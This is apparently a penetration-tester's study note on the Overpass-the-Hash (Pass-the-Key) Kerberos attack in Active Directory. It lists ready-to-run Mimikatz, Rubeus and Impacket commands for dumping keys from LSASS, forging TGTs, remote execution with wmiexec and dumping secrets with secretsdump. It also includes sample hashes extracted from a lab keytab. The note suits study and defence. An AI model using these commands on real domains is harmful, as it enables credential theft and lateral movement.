---
created: 2026-08-07
updated: 2026-10-11
tags:
  - AD
  - AD_attacks
  - Kerberos
status: substantial
---
## Overpass-the-Hash

> **Overpass-the-Hash** (also known as **Pass-the-Key**) is an attack where an attacker uses a compromised user's **long-term secret key** — such as an NT hash or an AES key — to perform the Kerberos AS exchange (`KRB_AS_REQ` / `KRB_AS_REP`) and obtain a valid TGT (Ticket-Granting Ticket) **without knowing the user's plaintext password**.

- Overpass-the-Hash is a way to obtain a **new TGT** without knowing the user's plaintext password. You use the user's long-term key to perform the AS exchange and receive a TGT directly from the KDC.
	- Once you have obtained the TGT, you can perform a standard [[Pass-the-Ticket]] (PtT) attack to use the TGT to request STs (Service Tickets) and access domain resources. 

> [!note] See [[Kerberos]] to learn more about the protocol and how it works.

>[!note] Overpass-the-Hash vs. Pass-the-Hash vs. Pass-the-Ticket
>- [[Pass-the-Hash]] (PtH) uses the NT hash to authenticate directly via the **NTLM protocol** ([`NTLMSSP`](https://learn.microsoft.com/en-us/windows/win32/com/ntlmssp)) over SMB/RPC; it doesn't have anything to do with Kerberos.
>- [[Pass-the-Ticket]] (PtT) reuses an **already-issued Kerberos ticket** (TGT or ST) harvested from a compromised system.
>- **Overpass-the-Hash** uses a long-term key (NT hash or AES key) to perform a **Kerberos AS exchange** (`KRB_AS_REQ` / `KRB_AS_REP`) with the KDC to request a *new* Kerberos TGT.

- Prerequisites for the attack:
	- A **user long-term secret key** (NT hash, AES-128 key, or AES-256 key).
	- **Network connectivity to a DC** (KDC) on port `88` (TCP/UDP).
	- **Proper DNS/host name resolution** for the Kerberos realm and target domain.

## Kerberos long-term keys

- Kerberos pre-authentication requires the client to prove knowledge of the user's **long-term secret key** derived from their password. 

>[!interesting]+ How Kerberos pre-authentication works
>1. The client sends an `AS-REQ` (Authentication Service Request) containing its username in cleartext and a **timestamp** encrypted with their long-term key.
>2. The AS (KDC) receives the request and attempts to decrypt the timestamp using the user's key it stores. If the decryption succeeds and the timestamp falls within an acceptable clock skew (typically **5 minutes**), the KDC issues an `AS-REP` containing the TGT encrypted with the user's key. 
>
>>[!note] If the username does not exist or pre-auth is disabled, the KDC may return the TGT anyway, making the account vulnerable to [[AS-REP roasting]].

- How the key is derived depends on the negotiated **encryption type (`etype`)**. It can be, for example, an RC4-HMAC key derived from the NT hash or an AES-128/AES-256 keys. 

>[!note]+ See [[Kerberos#Encryption types]].

- These keys are **long-term**: they are derived from the password when the password is set or changed and stored by the KDC as part of the account's Kerberos key material. 

>[!note]+ On RC4-HMAC
> - In Active Directory environments that still support RC4-HMAC, the **NT hash effectively serves as the Kerberos RC4 key**, meaning that if you hold a user's NT hash, you can use it directly as valid Kerberos key material for authentication.
> - However, in modern environments where RC4 is disabled or restricted via domain policy, this equivalence no longer applies. In such cases, Overpass-the-Hash with an NT hash will fail; you must instead rely on the user's **AES-128 or AES-256 Kerberos keys** (preferred and commonly enforced in newer AD deployments).
## Extracting Kerberos long-term keys

- Kerberos long-term keys (encryption keys) can be extracted from memory on compromised Windows hosts or obtained from keytab files.
### Extracting keys with Mimikatz

- Dump cached Kerberos encryption keys (RC4-HMAC, AES-128, AES-256) from LSASS memory:

```powershell
mimikatz.exe
```

```powershell
privilege::debug
```

```powershell
sekurlsa::ekeys
```

- [`privilege::debug`](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) requests/enables `SeDebugPrivilege` (to read LSASS memory).
- [`sekurlsa::ekeys`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/ekeys) lists cached Kerberos keys stored in LSASS memory for all active logon sessions (and displays RC4-HMAC, AES-128, and AES-256 keys).
## Executing Overpass-the-Hash

### Overpass-the-Hash on Windows

#### Rubeus

- Rubeus's `asktgt` performs a Kerberos **AS exchange** using the supplied long-term key and requests a TGT for the specified user.
- Request a TGT using an **AES-256 key**:

```powershell
Rubeus.exe asktgt /user:<user> /domain:<domain.com> /aes256:<AES256_key>
```

- Request a TGT using an **NT hash (RC4)**:

```powershell
Rubeus.exe asktgt /user:<user> /domain:<domain.com> /rc4:<NT_hash>
```

- Request a TGT using an AES-256 key and **inject it directly into the current logon session** (`/ptt`):

```powershell
Rubeus.exe asktgt /user:<user> /domain:<domain.com> /aes256:<AES256_key> /ptt
```

- Request a TGT and **save it to a `.kirbi` file**:

```powershell
Rubeus.exe asktgt /user:<user> /domain:<domain.com> /aes256:<AES256_key> /outfile:ticket.kirbi
```

>[!note] Adding `/ptt` automatically imports the newly requested TGT into the LSA Kerberos ticket cache of the current logon session. This allows you to use the TGT immediately with standard Windows utilities like `dir \\DC01\c$` or `Enter-PSSession`. See [[Pass-the-Ticket]].

#### Mimikatz

- You can perform Overpass-the-Hash using Mimikatz's [`sekurlsa::pth`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/pth) module.
- `sekurlsa::pth` creates a new process using `LOGON32_LOGON_NEW_CREDENTIALS` **(**`netonly`**)** and associates the supplied credential material with that logon context.
- When the resulting process accesses a remote domain resource, Windows can use the supplied Kerberos key to authenticate to the KDC and obtain a TGT for the specified account.
- Spawn a process with an **NT hash**:

```powershell
mimikatz.exe
```

```powershell
privilege::debug
```

```powershell
sekurlsa::pth /user:<user> /domain:<domain.com> /ntlm:<NT_hash> /run:cmd.exe
```

- Spawn a process with an **AES-256 key**:

```powershell
sekurlsa::pth /user:<user> /domain:<domain.com> /aes256:<AES256_key> /run:cmd.exe
```

- The spawned `cmd.exe` runs under the new logon context. When you use it to access a domain resource, Windows uses the supplied credential material to perform Kerberos authentication and obtain the required tickets.

>[!note] Unlike Rubeus's `asktgt /ptt`, `sekurlsa::pth` does not simply take an already-issued TGT and inject it. It starts a new logon context from which Kerberos credentials can subsequently be obtained.
### Overpass-the-Hash from Linux

#### Impacket

- Impacket's `getTGT.py` performs a Kerberos AS exchange and requests a TGT using an NT hash or AES key, then saves the resulting TGT in a `.ccache` file.

- Request a TGT using an **NT hash**:

```bash
getTGT.py -hashes :<NT_hash> <domain.com>/<user>
```

- Request a TGT using an **AES-256 key**:

```bash
getTGT.py -aesKey <AES256_key> <domain.com>/<user>
```

- Set the `KRB5CCNAME` environment variable to point to the saved `.ccache` file:

```bash
export KRB5CCNAME=/path/to/<user>.ccache
```

- Execute remote commands using the cached TGT (`-k -no-pass`):

```bash
wmiexec.py -k -no-pass <domain.com>/<user>@<target_FQDN>
```

```bash
secretsdump.py -k -no-pass <target_FQDN>
```

## Extracting keys from keytabs

- Inspect the contents of a `.keytab` file, use `ktutil`:

```bash
ktutil
```

```text
read_kt /path/to/file.keytab
list -e
```

>[!note] See [`ktutil`](https://man.archlinux.org/man/core/krb5/ktutil.1.en).

- Alternatively, Python tools like [`keytabextract`](https://github.com/sosdave/KeyTabExtract/blob/master/keytabextract.py) can extract encryption keys directly from `.keytab` files:

```bash
python3 keytabextract.py /path/to/file.keytab
```

>[!example]+
> ```bash
> python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
> ```
> 
> ```bash
> [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
> [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
> [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
> [+] Keytab File successfully imported.
> 	REALM : INLANEFREIGHT.HTB
> 	SERVICE PRINCIPAL : carlos/
> 	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
> 	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
> 	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
> ```

- Extracted AES or NT keys can then be used in Rubeus or Impacket to perform Overpass-the-Hash attacks.

>[!note] See [[Pass-the-Ticket#Kerberos keytabs]].
## References and further reading

- [`Overpass-the-Hash — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/opth)
- [`Abusing Kerberos with Rubeus — SpecterOps`](https://posts.specterops.io/)
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Mimikatz — gentilkiwi GitHub`](https://github.com/gentilkiwi/mimikatz)
- [`Impacket — Fortra GitHub`](https://github.com/fortra/impacket)
- [`Kerberos Keytab Files — MIT Kerberos Documentation`](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/keytab_def.html)
